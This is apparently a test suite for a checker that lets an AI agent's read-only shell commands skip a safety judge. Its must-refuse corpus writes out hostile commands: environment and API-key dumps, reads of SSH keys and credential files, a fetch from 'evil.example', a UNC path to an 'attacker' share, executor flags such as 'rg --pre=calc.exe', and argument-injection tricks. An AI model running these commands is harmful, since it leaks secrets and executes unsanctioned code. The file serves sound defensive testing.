/**
 * ADR-084 §1 — the static read-only checker.
 *
 * The bar is "never allow what the judge would have blocked", so the bulk of
 * this file is must-refuse cases: the 49-case adversarial corpus from the design
 * consult (every probe verified live against git 2.55 / pwsh 7.6 / WinPS 5.1 /
 * Git-for-Windows coreutils, re-spelled with synthetic paths), the remaining
 * probes of fable-design §7.1, and a segment-independence property over all of
 * them. The must-bypass table keeps the feature worth having.
 *
 * All paths are synthetic: a fake Windows workspace `D:\work\repo` (and a POSIX
 * `/work/repo` for the non-Windows branch); `realpath` is injected.
 */
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import { describe, it, expect } from 'vitest'
import {
  bindsGciParameter,
  GCI_PARAMETERS,
  isSensitiveComponent,
  SENSITIVE_SAMPLES,
  parseRuleText,
  readOnlyVerdict,
  READ_ONLY_SUMMARY_MAX,
  type ReadOnlyScope,
  type ReadOnlyVerdict
} from '../read-only'

const CWD = 'D:\\work\\repo'
const OUTSIDE_HOME = 'C:\\Users\\someone'

function winScope(overrides: Partial<ReadOnlyScope> = {}): ReadOnlyScope {
  return {
    cwd: CWD,
    additionalDirectories: [],
    platform: 'win32',
    rules: {},
    realpath: () => undefined,
    ...overrides
  }
}

function posixScope(overrides: Partial<ReadOnlyScope> = {}): ReadOnlyScope {
  return {
    cwd: '/work/repo',
    additionalDirectories: [],
    platform: 'linux',
    rules: {},
    realpath: () => undefined,
    ...overrides
  }
}

function verdict(
  command: string,
  opts: { workdir?: string; scope?: ReadOnlyScope; toolName?: string } = {}
): ReadOnlyVerdict {
  const input: Record<string, unknown> = { command }
  if (opts.workdir !== undefined) input.workdir = opts.workdir
  return readOnlyVerdict({ toolName: opts.toolName ?? 'bash', input }, opts.scope ?? winScope())
}

function expectBypass(command: string, opts: Parameters<typeof verdict>[1] = {}): void {
  const v = verdict(command, opts)
  expect(v, `${command} → ${JSON.stringify(v)}`).toMatchObject({ ok: true })
}

function expectRefuse(
  command: string,
  opts: Parameters<typeof verdict>[1] = {},
  reason?: string | RegExp
): void {
  const v = verdict(command, opts)
  expect(v.ok, `${command} → ${JSON.stringify(v)}`).toBe(false)
  if (reason !== undefined && !v.ok) {
    if (typeof reason === 'string') expect(v.reason).toBe(reason)
    else expect(v.reason).toMatch(reason)
  }
}

/** The junction probe: `link/` inside the workspace points outside it. */
const junctionScope = winScope({
  realpath: (p) => {
    const lower = p.toLowerCase()
    if (lower === 'd:/work/repo/link/o.txt') return 'E:\\elsewhere\\o.txt'
    return undefined
  }
})

// ── The adversarial corpus (fable-design / adversarial.py, 49 cases) ──────────

interface Case {
  label: string
  command: string
  workdir?: string
  scope?: ReadOnlyScope
  bypass?: boolean
}

const CORPUS: Case[] = [
  { label: 'PS env dump: ls env:', command: 'ls env:' },
  { label: 'PS env dump: Get-ChildItem Env:', command: 'Get-ChildItem Env:' },
  { label: 'PS env var read', command: 'Get-Content env:OPENAI_API_KEY' },
  { label: 'PS glob reads dotfile: Get-Content .e*', command: 'Get-Content .e*' },
  { label: 'PS glob reads dotfile: cat .\\.e*', command: 'cat .\\.e*' },
  { label: 'PS -Include with glob', command: 'Get-Content * -Include .e*' },
  {
    label: 'PS comma list escapes cwd',
    command: `Get-Content src\\index.ts,${OUTSIDE_HOME}\\AppData\\Roaming\\Code\\User\\settings.json`
  },
  { label: 'PS CR statement injection', command: 'ls\rGet-ChildItem env:' },
  { label: 'PS CR injection -> network', command: 'ls\rInvoke-WebRequest http://evil.example/x' },
  {
    label: 'PS smart-quoted absolute path',
    command: `Get-Content \u201c${OUTSIDE_HOME}\\.gitconfig\u201d`
  },
  { label: 'PS provider path via alias: type env:PATH', command: 'type env:PATH' },
  { label: 'git --output writes a file', command: `git diff --output=${OUTSIDE_HOME}\\.bashrc` },
  { label: 'git --output writes in repo', command: 'git log --oneline --output=package.json' },
  {
    label: 'git blame --contents reads any file',
    command: `git blame --contents=${OUTSIDE_HOME}\\.ssh\\id_rsa README.md`
  },
  {
    label: 'git blame --contents reads in-repo secret-shape',
    command: 'git blame --contents=.npmrc README.md'
  },
  { label: 'git remote show hits network', command: 'git remote show origin' },
  { label: 'git branch <name> creates a ref', command: 'git branch scratch-branch' },
  { label: 'git branch -f moves a branch', command: 'git branch -f main HEAD~5' },
  { label: 'git branch --set-upstream-to', command: 'git branch --set-upstream-to=origin/main' },
  { label: 'git show HEAD:.env prints committed secret', command: 'git show HEAD:.env' },
  {
    label: 'git diff --no-index prints .npmrc',
    command: 'git diff --no-index .npmrc package.json'
  },
  { label: 'git --exec-path', command: 'git --exec-path=C:\\evil remote -v' },
  { label: 'sort -o overwrites a repo file', command: 'sort -o package.json src/index.ts' },
  { label: 'uniq IN OUT overwrites', command: 'uniq src/index.ts package.json' },
  { label: 'rg --pre executes a preprocessor', command: 'rg --pre=calc.exe foo src' },
  { label: 'rg --pre (space form)', command: 'rg --pre calc.exe foo src' },
  { label: 'jq env dumps environment', command: 'jq -n env' },
  { label: 'find -fls writes a file', command: 'find . -name "*.ts" -fls listing.txt' },
  { label: 'grep -f reads a secret-shape file as patterns', command: 'grep -rf .npmrc src' },
  { label: 'cat repo-local .npmrc', command: 'cat .npmrc' },
  { label: 'cat repo-local .pypirc', command: 'cat .pypirc' },
  { label: 'cat .git-credentials', command: 'cat .git-credentials' },
  { label: 'Select-String prints .npmrc', command: 'Select-String -Pattern . -Path .npmrc' },
  {
    label: 'cat via in-tree junction to outside scope',
    command: 'cat link/o.txt',
    scope: junctionScope
  },
  {
    label: 'workdir outside scope, git',
    command: 'git status',
    workdir: `${OUTSIDE_HOME}\\other-repo`
  },
  { label: 'workdir = home, cat .npmrc', command: 'cat .npmrc', workdir: OUTSIDE_HOME },
  { label: 'workdir = home, ls -la', command: 'ls -la', workdir: OUTSIDE_HOME },
  { label: 'Where-Object comparison form', command: 'ls | Where-Object Name -eq x', bypass: true },
  { label: 'bash backslash view: cat .\\.env', command: 'cat .\\.env' },
  { label: 'trailing dot opens .env', command: 'cat .env.' },
  { label: 'git -C escapes', command: `git -C ${OUTSIDE_HOME} log --oneline` },
  { label: 'git -c diff.external executes', command: 'git -c diff.external=calc.exe diff HEAD~1' },
  { label: 'git config --list reveals config', command: 'git config --list' },
  { label: 'tail -f blocks', command: 'tail -f package.json' },
  {
    label: 'Get-ChildItem -Recurse C:\\ (outside)',
    command: 'Get-ChildItem -Recurse C:\\ -Filter *.kdbx'
  },
  { label: 'UNC path', command: 'Get-Content \\\\attacker\\share\\x' },
  { label: '2>&1 tolerated', command: 'git status 2>&1', bypass: true },
  { label: 'plain read', command: 'git status --short && git diff --stat', bypass: true },
  // adversarial.py marks this one "must bypass"; the ADR-084 follow-up ruling
  // refuses recursive grep outright (it prints secret files inside the tree it
  // walks), so it is a refusal here. The quoted `&&`/`|` handling it was about
  // is still covered by the non-recursive must-bypass cases below.
  { label: 'grep with quoted regex, recursive', command: 'grep -rn "a && b|c" src' }
]

describe('adversarial corpus (49 cases)', () => {
  it('has all 49 cases; three of the four labelled "must bypass" still bypass', () => {
    expect(CORPUS).toHaveLength(49)
    expect(CORPUS.filter((c) => c.bypass)).toHaveLength(3)
  })

  for (const c of CORPUS) {
    it(`${c.bypass ? 'bypasses' : 'refuses'}: ${c.label}`, () => {
      const opts = { workdir: c.workdir, scope: c.scope }
      if (c.bypass) expectBypass(c.command, opts)
      else expectRefuse(c.command, opts)
    })
  }
})

// ── fable-design §7.1 probes not already in the corpus ────────────────────────

const PROBES: Array<{
  label: string
  command: string
  workdir?: string
  reason?: string | RegExp
}> = [
  { label: 'en-dash parameter', command: 'Get-ChildItem \u2013Name', reason: /^text:char/ },
  { label: 'smart-quoted .env', command: 'cat \u201c.env\u201d', reason: /^text:char/ },
  { label: 'NBSP fused token', command: 'ls\u00a0-la', reason: /^text:char/ },
  { label: 'LS separator', command: 'ls\u2028ls', reason: /^text:char/ },
  { label: 'NUL', command: 'ls\u0000', reason: /^text:char/ },
  { label: 'DEL', command: 'ls\u007f', reason: /^text:char/ },
  { label: 'zero-width space', command: 'l\u200bs', reason: /^text:char/ },
  { label: 'fullwidth semicolon', command: 'ls\uff1bpwd', reason: /^text:char/ },
  { label: 'LF', command: 'ls\npwd', reason: /^text:char/ },
  { label: '* -Include .env', command: 'Get-Content * -Include .env' },
  { label: 'calculated property', command: 'ls | Select-Object @{n="x";e={1}}' },
  { label: 'git grep -O runs a pager', command: "git grep -O'calc' foo", reason: 'cmd:git grep' },
  { label: 'git -C ..', command: 'git -C .. status', reason: 'flag:git -C' },
  { label: 'find -exec', command: 'find . -exec rm {} ;' },
  {
    label: 'find -execdir',
    command: 'find . -name "*.ts" -execdir cat x',
    reason: 'flag:find -execdir'
  },
  { label: 'find -delete', command: 'find . -name "*.log" -delete', reason: 'flag:find -delete' },
  { label: 'find -L follows links', command: 'find -L .', reason: 'flag:find -L' },
  { label: 'grep -f', command: 'grep -f patterns.txt src', reason: 'flag:grep -f' },
  { label: 'grep -R follows links', command: 'grep -R foo .', reason: 'flag:grep -R' },
  {
    label: 'grep --exclude-from',
    command: 'grep --exclude-from=x foo a.ts',
    reason: /^flag:grep --exclude-from/
  },
  { label: 'rg -L follows links', command: 'rg -L foo', reason: 'flag:rg -L' },
  {
    label: 'rg --ignore-file',
    command: 'rg --ignore-file=x foo',
    reason: /^flag:rg --ignore-file/
  },
  { label: 'rg -z runs decompressors', command: 'rg -z foo', reason: 'flag:rg -z' },
  {
    label: ':/ with workdir',
    command: 'git diff :/',
    workdir: 'D:\\work\\repo\\sub',
    reason: 'path:git-magic'
  },
  {
    label: 'workdir outside scope',
    command: 'ls',
    workdir: 'D:\\work\\other',
    reason: /^workdir path:out-of-scope/
  },
  { label: '../x', command: 'cat ../x.txt', reason: 'path:out-of-scope' },
  {
    label: 'C:.env drive-relative',
    command: 'cat C:.env',
    reason: /^path:(drive-relative|sensitive)/
  },
  { label: 'drive-relative D:x', command: 'cat D:notes.txt', reason: 'path:drive-relative' },
  { label: '\\\\host\\share', command: 'cat \\\\host\\share\\x' },
  { label: '//./PhysicalDrive0', command: 'cat //./PhysicalDrive0', reason: 'path:unc' },
  { label: '/proc/self/environ', command: 'cat /proc/self/environ', reason: 'path:out-of-scope' },
  { label: '/dev/clipboard', command: 'cat /dev/clipboard', reason: 'path:out-of-scope' },
  { label: 'quoted "*" still globs in PS', command: 'Get-Content "*"', reason: 'path:glob' },
  { label: '2>x redirect', command: 'git status 2>x', reason: 'token:>' },
  { label: '> redirect', command: 'git log > out.txt', reason: 'token:>' },
  { label: '>> in quotes', command: 'echo "a>b"', reason: 'token:>' },
  { label: 'input redirect', command: 'cat < .env', reason: 'token:<' },
  { label: 'backgrounding', command: 'ls & pwd', reason: 'token:&' },
  { label: 'command substitution', command: 'cat $(pwd)/x', reason: 'token:$' },
  { label: 'backtick', command: 'cat `pwd`', reason: 'token:`' },
  { label: 'PS static member', command: 'Get-Content x::y', reason: 'token:::' },
  { label: 'stop-parsing token', command: 'git --% status', reason: 'token:--%' },
  {
    label: 'leading env assignment',
    command: 'GIT_DIR=x git status',
    reason: 'segment:assignment'
  },
  { label: 'eval', command: 'eval ls', reason: 'cmd:refused eval' },
  { label: 'source', command: 'source x.sh', reason: 'cmd:refused source' },
  { label: 'dot-source', command: '. x.ps1', reason: 'cmd:refused .' },
  { label: 'unbalanced quote', command: 'cat "src/a.ts', reason: 'token:unbalanced-quote' },
  { label: 'tilde home', command: 'cat ~/.bashrc', reason: 'token:~' },
  { label: 'URL', command: 'cat http://example.test/x', reason: /^path:(provider|url)/ },
  { label: 'empty segment', command: 'ls ;; pwd', reason: 'segment:empty' },
  { label: 'trailing operator', command: 'ls &&', reason: 'segment:empty' },
  { label: 'pathed command', command: './git status', reason: 'cmd:path' },
  { label: 'quoted command', command: '"git" status', reason: 'cmd:quoted' },
  { label: 'git remote get-url', command: 'git remote get-url origin', reason: 'arg:git remote' },
  { label: 'git ls-remote', command: 'git ls-remote', reason: 'cmd:git ls-remote' },
  { label: 'git stash', command: 'git stash list', reason: 'cmd:git stash' },
  { label: 'git --paginate', command: 'git --paginate log', reason: 'flag:git --paginate' },
  { label: 'git --ext-diff', command: 'git diff --ext-diff', reason: 'flag:git --ext-diff' },
  { label: 'git --textconv', command: 'git log -p --textconv', reason: 'flag:git --textconv' },
  {
    label: 'git --show-signature',
    command: 'git log --show-signature',
    reason: 'flag:git --show-signature'
  },
  { label: 'git abbreviated --out', command: 'git log --out=x', reason: 'flag:git log --out' },
  { label: 'git -O', command: 'git diff -Ofile', reason: 'flag:git -Ofile' },
  {
    label: 'Get-Content -Wait',
    command: 'Get-Content -Wait x.log',
    reason: 'flag:Get-Content -Wait'
  },
  {
    label: 'Get-Content -Stream',
    command: 'Get-Content x.txt -Stream s',
    reason: 'flag:Get-Content -Stream'
  },
  { label: 'cat -s is -Stream to PowerShell', command: 'cat -s x.txt', reason: 'flag:cat -s' },
  {
    label: 'Get-ChildItem -FollowSymlink',
    command: 'Get-ChildItem -Recurse -FollowSymlink',
    reason: 'flag:Get-ChildItem -FollowSymlink'
  },
  { label: 'Where-Object script block', command: 'ls | Where-Object { $_.Name }' },
  {
    label: 'Where-Object -and',
    command: 'ls | Where-Object Name -eq x -and',
    reason: 'arg:Where-Object form'
  },
  { label: 'unknown command', command: 'sed -n 1p x', reason: 'cmd:refused sed' },
  { label: 'Invoke-*', command: 'Invoke-Expression x', reason: 'cmd:refused invoke-expression' },
  { label: 'python', command: 'python3 -c 1', reason: 'cmd:refused python3' },
  { label: 'iex', command: 'iex x', reason: 'cmd:refused iex' },
  {
    label: 'write messages another tty in bash',
    command: 'write root',
    reason: 'cmd:refused write'
  },
  { label: 'PS comment hides nothing', command: 'ls # ; rm x', reason: 'token:#' },
  { label: 'backslash before separator', command: 'cat a\\;b', reason: 'token:backslash' },
  { label: 'backslash-quote', command: 'cat "a\\" b"', reason: 'token:backslash' },
  {
    label: 'quoted flag is a string to PS',
    command: 'cat "-Tail" 5 x',
    reason: 'token:quoted-flag'
  },
  {
    label: 'unquoted glob in a bash command',
    command: 'grep foo *.ts',
    reason: 'token:unquoted-glob'
  },
  {
    label: 'unquoted comma splits PS native args',
    command: 'grep foo,.env src',
    reason: 'token:comma'
  },
  { label: '8.3 short name', command: 'cat ENVLOC~1', reason: 'token:~' },
  { label: 'cmd %VAR%', command: 'cat "%USERPROFILE%/x"', reason: 'path:special %' },
  { label: 'cmd ^ escape', command: 'cat .e^nv', reason: 'path:special ~^' },
  { label: 'device name', command: 'cat CON', reason: 'path:device CON' },
  { label: 'ADS colon', command: 'cat a.txt:hidden', reason: 'path:colon' },
  { label: 'three dots', command: 'cat .../x', reason: 'path:dots' },
  {
    label: 'ls | cat reads every file in PowerShell',
    command: 'ls | cat',
    reason: 'pipe:Get-Content after Get-ChildItem'
  },
  {
    label: 'ls | Select-String reads files',
    command: 'ls | Select-String foo',
    reason: /^pipe:Select-String/
  },
  {
    label: 'strings bound to Get-ChildItem -Path',
    command: 'git ls-files | Get-ChildItem',
    reason: /^pipe:Get-ChildItem/
  },
  {
    label: 'strings bound to Test-Path',
    command: 'cat list.txt | Test-Path',
    reason: /^pipe:Test-Path/
  },
  {
    label: 'find pattern escaping scope',
    command: 'find . -path "../x.txt"',
    reason: 'path:out-of-scope'
  },
  // `<`/`>` stay refused outside single quotes.
  { label: '> in double quotes', command: 'grep -n "a->b" src/a.ts', reason: 'token:>' },
  { label: '< in double quotes', command: 'git log --format="<%h>"', reason: 'token:<' },
  { label: 'unquoted <', command: 'grep -n a<b src/a.ts', reason: 'token:<' },
  // Win32 file APIs treat `<`, `>` and `"` as wildcards.
  { label: '< in a single-quoted path', command: "cat 'src/.e<'", reason: 'path:special <>"' },
  {
    label: '> in a single-quoted name filter',
    command: "Get-ChildItem -Filter '.e>' src",
    reason: /^value:Get-ChildItem/
  },
  // A bundle PowerShell would bind to a Get-ChildItem parameter.
  { label: 'ls -ad binds -Directory (alias ad)', command: 'ls -ad', reason: 'flag:ls -ad' },
  { label: 'ls -ah binds -Hidden (alias ah)', command: 'ls -ah', reason: 'flag:ls -ah' },
  { label: 'ls -fo binds -Force/-FollowSymlink', command: 'ls -fol', reason: 'flag:ls -fol' },
  // rg is safe only with its defaults (skip hidden + gitignored files).
  { label: 'rg --hidden', command: 'rg --hidden KEY src', reason: 'flag:rg --hidden' },
  { label: 'rg -. (hidden)', command: 'rg -. KEY', reason: 'flag:rg -.' },
  { label: 'rg -u', command: 'rg -u KEY', reason: 'flag:rg -u' },
  { label: 'rg -uuu', command: 'rg -uuu KEY', reason: 'flag:rg -u' },
  {
    label: 'rg --unrestricted',
    command: 'rg --unrestricted KEY',
    reason: 'flag:rg --unrestricted'
  },
  { label: 'rg --no-ignore', command: 'rg --no-ignore KEY', reason: 'flag:rg --no-ignore' },
  {
    label: 'rg --no-ignore-vcs',
    command: 'rg --no-ignore-vcs KEY',
    reason: 'flag:rg --no-ignore-vcs'
  },
  {
    label: 'rg --no-ignore-dot',
    command: 'rg --no-ignore-dot KEY',
    reason: 'flag:rg --no-ignore-dot'
  },
  {
    label: 'rg --no-ignore-global',
    command: 'rg --no-ignore-global KEY',
    reason: 'flag:rg --no-ignore-global'
  },
  {
    label: 'rg --no-ignore-parent',
    command: 'rg --no-ignore-parent KEY',
    reason: 'flag:rg --no-ignore-parent'
  },
  {
    label: 'rg --no-ignore-exclude',
    command: 'rg --no-ignore-exclude KEY',
    reason: 'flag:rg --no-ignore-exclude'
  },
  // A positive rg glob whitelists what it matches, overriding those defaults.
  {
    label: 'rg -g naming .env',
    command: 'rg -g ".env" KEY',
    reason: /^path:pattern-may-match-sensitive/
  },
  { label: 'rg -g "*"', command: 'rg -g "*" KEY', reason: 'path:pattern-may-match-sensitive *' },
  {
    label: 'rg -g "src/**"',
    command: 'rg --glob "src/**" KEY',
    reason: 'path:pattern-may-match-sensitive **'
  },
  { label: 'rg -g directory glob', command: 'rg -g "src" KEY', reason: /directory glob/ },
  {
    label: 'rg -g "*.json"',
    command: 'rg -g "*.json" KEY',
    reason: /^path:pattern-may-match-sensitive/
  },
  {
    label: 'cat .git/config (URL credentials)',
    command: 'cat .git/config',
    reason: 'path:sensitive .git'
  },
  {
    label: 'MSYS path is a different file to PowerShell',
    command: 'cat /d/work/repo/a.ts',
    reason: 'path:out-of-scope'
  },
  {
    label: 'git pathspec glob reaching .env',
    command: 'git diff -- ".e*"',
    reason: 'path:pattern-may-match-sensitive .e*'
  },
  {
    label: 'git pathspec naming .env',
    command: 'git log -p -- .env',
    reason: 'path:sensitive .env'
  },
  { label: 'git revision:path with ancestry', command: 'git show HEAD~1:.env', reason: 'token:~' },
  { label: 'git value carrying ~', command: 'git log --since ~x', reason: 'token:~' },
  {
    label: 'escaped > is a live redirect to PowerShell',
    command: 'cat a\\>b',
    reason: 'token:backslash'
  },
  {
    label: 'escaped comma is a live array to PowerShell',
    command: 'grep foo\\,.env src',
    reason: 'token:backslash'
  },
  {
    label: 'strings bound to Get-Command -Name',
    command: 'git ls-files | Get-Command',
    reason: 'pipe:Get-Command after |'
  },
  // Recursive grep prints every secret file inside the tree it walks.
  { label: 'grep -r', command: 'grep -rn url src', reason: 'flag:grep -r' },
  { label: 'grep -r at the root', command: 'grep -rn url .', reason: 'flag:grep -r' },
  {
    label: 'grep --recursive',
    command: 'grep --recursive url src',
    reason: 'flag:grep --recursive'
  },
  { label: 'grep -d recurse', command: 'grep -d recurse url src', reason: 'flag:grep -d' },
  {
    label: 'grep --directories=recurse',
    command: 'grep --directories=recurse url src',
    reason: 'flag:grep --directories'
  },
  // PowerShell has no way to make Select-String walk a tree here.
  {
    label: 'Select-String -Path glob',
    command: 'Select-String -Pattern KEY -Path src\\*',
    reason: 'path:glob'
  },
  {
    label: 'Select-String -Include',
    command: 'Select-String -Pattern KEY -Path src -Include *.ts',
    reason: 'flag:Select-String -Include'
  },
  {
    label: 'Get-ChildItem -Recurse | Select-String reads every file',
    command: 'Get-ChildItem -Recurse src | Select-String KEY',
    reason: 'pipe:Select-String after Get-ChildItem'
  },
  {
    label: 'Get-ChildItem -Recurse | Get-Content reads every file',
    command: 'Get-ChildItem -Recurse -File | Get-Content',
    reason: 'pipe:Get-Content after Get-ChildItem'
  },
  {
    label: 'ls -R | sls',
    command: 'ls -R | sls KEY',
    reason: 'pipe:Select-String after Get-ChildItem'
  },
  { label: 'zsh =cmd expansion', command: 'cat =ls', reason: 'path:=' },
  {
    label: 'PowerShell splits text glued after a closing quote',
    command: 'cat "src/a.ts"..\\..\\x',
    reason: 'token:text-after-quote'
  },
  {
    label: 'WinPS 5.1 legacy passing: embedded quote injects argv',
    command: `rg 'a" --pre=calc "b' src`,
    reason: 'token:embedded-quote'
  },
  {
    label: 'WinPS 5.1 legacy passing: trailing backslash in a spaced arg',
    command: `rg 'a b\\' ' --pre=calc' src`,
    reason: 'token:trailing-backslash'
  },
  { label: 'WinPS 5.1 drops empty native args', command: 'rg "" src', reason: 'token:empty-arg' },
  {
    label: 'Get-Command exposing a script body',
    command: 'Get-Command x | Select-Object -ExpandProperty ScriptContents',
    reason: 'pipe:Get-Command ScriptContents'
  },
  {
    label: 'Get-Command objects read as files',
    command: 'Get-Command git | cat',
    reason: 'pipe:after Get-Command'
  },
  {
    label: 'rg --file reads patterns from a file',
    command: 'rg --file=x foo',
    reason: 'flag:rg --file'
  },
  { label: 'grep --file', command: 'grep --file x foo', reason: 'flag:grep --file' },
  { label: 'interior empty comma piece', command: 'Get-Content a.ts,,b.ts', reason: 'path:empty' },
  {
    label: 'unquoted backslash path is drive-relative to bash',
    command: 'cat D:\\work\\repo\\a.ts',
    reason: 'path:drive-relative'
  }
]

describe('fable-design §7.1 probes and the other token rules', () => {
  for (const p of PROBES) {
    it(`refuses: ${p.label}`, () => {
      expectRefuse(p.command, { workdir: p.workdir }, p.reason)
    })
  }

  it('refuses a directory override the checker does not model', () => {
    const v = readOnlyVerdict(
      { toolName: 'bash', input: { command: 'ls', cwd: 'C:\\' } },
      winScope()
    )
    expect(v).toEqual({ ok: false, reason: 'input:cwd' })
  })
})

// ── Must-bypass shapes ────────────────────────────────────────────────────────

const MUST_BYPASS: Array<{ command: string; workdir?: string }> = [
  { command: 'git status' },
  { command: 'git status --short' },
  { command: 'git status -sb' },
  { command: 'git diff --stat' },
  { command: 'git diff HEAD~1 -- src/a.ts' },
  { command: 'git log --oneline -20' },
  { command: 'git log --oneline -n 5 --format="%h %s"' },
  { command: 'git show HEAD --stat' },
  { command: 'git branch --show-current' },
  { command: 'git branch --list "feat/*"' },
  { command: 'git diff -- "*.ts"' },
  { command: 'git show main^' },
  { command: 'git rev-parse HEAD' },
  { command: 'git rev-parse --abbrev-ref HEAD' },
  { command: 'git ls-files src' },
  { command: 'git merge-base HEAD origin/main' },
  { command: 'git remote -v' },
  { command: 'git --no-pager diff --cached' },
  { command: 'ls -la' },
  { command: 'ls -1' },
  { command: 'ls -alh' },
  { command: 'ls -lart' },
  { command: 'ls -altr src' },
  // find lists names; a name filter never reads a file (Windows find.exe
  // rejects `-name` as a bad switch before opening anything).
  { command: 'find . -name "*.json"' },
  { command: 'find . -name "*.env"' },
  { command: 'find . -path "*/x/*"' },
  // `<`/`>` are literal inside single quotes in both shells.
  { command: "grep -n 'a->b' src/a.ts" },
  { command: "grep -n -e '->' src/a.ts" },
  { command: "git log --format='<%h>' -5" },
  // PowerShell array spelled across tokens.
  { command: 'Select-String -Pattern foo -Path src\\a.ts -Context 2, 10' },
  { command: 'ls src' },
  { command: 'rg -n "foo" src' },
  { command: 'rg -n --glob "*.ts" foo src' },
  // Recursive grep is refused (see the grep -r probes); single files still pass.
  { command: 'grep -n "a|b" src/a.ts' },
  { command: 'grep -n "a && b|c" src/a.ts' },
  { command: 'head -n 50 README.md' },
  { command: 'head -50 README.md' },
  { command: 'tail -n 20 src/a.ts' },
  { command: 'wc -l src/a.ts' },
  { command: 'cat -n src/a.ts' },
  { command: 'find src -name "*.ts" -type f' },
  { command: 'find . -maxdepth 2 -name "*.md"' },
  { command: 'echo ---' },
  { command: 'echo "hello world"' },
  { command: 'pwd' },
  { command: 'date +%Y-%m-%d' },
  // -Filter is a NAME pattern under an already-checked -Path (it lists, never reads).
  { command: 'Get-ChildItem -Recurse -Filter *.ts src' },
  { command: 'Get-ChildItem -Path "D:\\work\\repo\\src" -File -ErrorAction SilentlyContinue' },
  { command: 'Get-Content src\\a.ts -Tail 20' },
  { command: 'Get-Content "D:\\work\\repo\\src\\a.ts" | Measure-Object -Line' },
  { command: 'Select-String -Pattern foo -Path src\\a.ts -Context 2,10' },
  { command: 'Select-String -Pattern "a|b" -Path src\\a.ts,src\\b.ts' },
  { command: 'ls | Select-Object -First 5' },
  { command: 'Get-ChildItem src | Select-Object Name, Length | Format-Table -AutoSize' },
  { command: 'Test-Path -LiteralPath src\\a.ts' },
  { command: 'Get-Command git -ErrorAction SilentlyContinue' },
  { command: 'git log --oneline | Select-String fix' },
  { command: 'git status | cat' },
  { command: 'Get-Content src\\a.ts | Select-String foo' },
  { command: 'rg -n url src' },
  { command: 'rg --files src' },
  { command: 'rg -n KEY --glob "!**/*.test.ts" src' },
  { command: 'rg -n KEY -g "*.ts" src' },
  // PowerShell `a, b` arrays span tokens.
  {
    command:
      'Get-Command node, git -ErrorAction SilentlyContinue | Format-Table -AutoSize Name,Source'
  },
  { command: 'Get-ChildItem -Path "src\\a", "src\\b" -Recurse -File' },
  // A token that starts with a quote is a string to a cmdlet, not a parameter.
  { command: 'Write-Host "---branch---"' },
  { command: 'echo ===RESULT===' },
  { command: 'Get-Content "src\\a.ts","src\\b.ts"' },
  { command: 'git status 2>&1' },
  { command: 'git diff --stat && git status' },
  { command: 'Write-Host "---"; git status' },
  // Scope details.
  { command: 'git status', workdir: 'D:\\work\\repo\\sub' },
  { command: 'git status', workdir: '/d/work/repo/sub' },
  { command: 'cat src/core/auth/vault/AuthVault.ts' }
]

describe('must-bypass shapes', () => {
  for (const c of MUST_BYPASS) {
    it(`bypasses: ${c.command}${c.workdir ? ` (workdir ${c.workdir})` : ''}`, () => {
      expectBypass(c.command, { workdir: c.workdir })
    })
  }

  it('reads inside an additional directory', () => {
    const scope = winScope({ additionalDirectories: ['E:\\shared\\docs'] })
    expectBypass('cat "E:\\shared\\docs\\guide.md"', { scope })
    expectRefuse('cat "E:\\shared\\other.md"', { scope }, 'path:out-of-scope')
  })

  it('treats the cwd itself as in scope', () => {
    expectBypass('ls "D:\\work\\repo"')
    expectBypass('ls .')
  })

  it('resolves a relative additional directory against the session cwd', () => {
    const scope = winScope({ additionalDirectories: ['..\\shared'] })
    expectBypass('cat ../shared/guide.md', { scope })
    expectRefuse('cat ../other/guide.md', { scope }, 'path:out-of-scope')
  })

  it('refuses when the session cwd is not absolute', () => {
    expectRefuse('ls', { scope: winScope({ cwd: 'work\\repo' }) }, 'scope:cwd-not-absolute')
    expectRefuse('ls', { scope: winScope({ cwd: '' }) }, 'scope:no-cwd')
  })
})

// ── Segment independence ──────────────────────────────────────────────────────

describe('segment independence', () => {
  const refusals = [
    ...CORPUS.filter((c) => !c.bypass && !c.workdir && !c.scope).map((c) => c.command),
    ...PROBES.filter((p) => !p.workdir).map((p) => p.command)
  ]

  it('has a real refusal set to work with', () => {
    expect(refusals.length).toBeGreaterThan(100)
  })

  for (const c of refusals) {
    it(`stays refused when chained: ${JSON.stringify(c)}`, () => {
      expect(verdict(c).ok).toBe(false)
      expect(verdict(`ls; ${c}`).ok).toBe(false)
      expect(verdict(`${c} | cat`).ok).toBe(false)
      expect(verdict(`${c} && pwd`).ok).toBe(false)
    })
  }

  it('the corpus cases that need a workdir or junction stay refused when chained', () => {
    for (const c of CORPUS.filter((x) => !x.bypass && (x.workdir || x.scope))) {
      const opts = { workdir: c.workdir, scope: c.scope }
      expect(verdict(`ls; ${c.command}`, opts).ok).toBe(false)
      expect(verdict(`${c.command} | cat`, opts).ok).toBe(false)
    }
  })
})

// ── Verdict shape ─────────────────────────────────────────────────────────────

describe('verdict shape', () => {
  it('needsGitCheck is true iff a git segment exists', () => {
    expect(verdict('git status')).toMatchObject({ ok: true, needsGitCheck: true })
    expect(verdict('ls && git diff --stat')).toMatchObject({ ok: true, needsGitCheck: true })
    expect(verdict('ls -la')).toMatchObject({ ok: true, needsGitCheck: false })
    expect(verdict('rg -n "git status" src')).toMatchObject({ ok: true, needsGitCheck: false })
  })

  it('summary is the whitespace-normalised command, capped at 160 chars', () => {
    expect(verdict('  git   status\t--short ')).toMatchObject({
      ok: true,
      summary: 'git status --short'
    })
    const long = `echo ${'a'.repeat(400)}`
    const v = verdict(long)
    expect(v.ok).toBe(true)
    if (v.ok) {
      expect(v.summary).toHaveLength(READ_ONLY_SUMMARY_MAX)
      expect(v.summary.endsWith('…')).toBe(true)
    }
  })

  it('refuses non-shell tools and empty commands', () => {
    expect(readOnlyVerdict({ toolName: 'read', input: { filePath: 'x' } }, winScope())).toEqual({
      ok: false,
      reason: 'not-shell'
    })
    expect(verdict('   ')).toEqual({ ok: false, reason: 'input:command' })
    expect(readOnlyVerdict({ toolName: 'shell', input: { command: 'ls' } }, winScope()).ok).toBe(
      true
    )
  })

  it('refuses a command over the length cap', () => {
    expect(verdict(`echo ${'a'.repeat(2000)}`)).toEqual({ ok: false, reason: 'text:too-long' })
  })

  it('never throws, even when realpath does', () => {
    const scope = winScope({
      realpath: () => {
        throw new Error('EPERM')
      }
    })
    expect(verdict('cat src/a.ts', { scope })).toEqual({
      ok: false,
      reason: 'path:realpath-unknown'
    })
  })

  it('refuses when realpath cannot tell (null)', () => {
    expect(verdict('cat src/a.ts', { scope: winScope({ realpath: () => null }) })).toEqual({
      ok: false,
      reason: 'path:realpath-unknown'
    })
  })

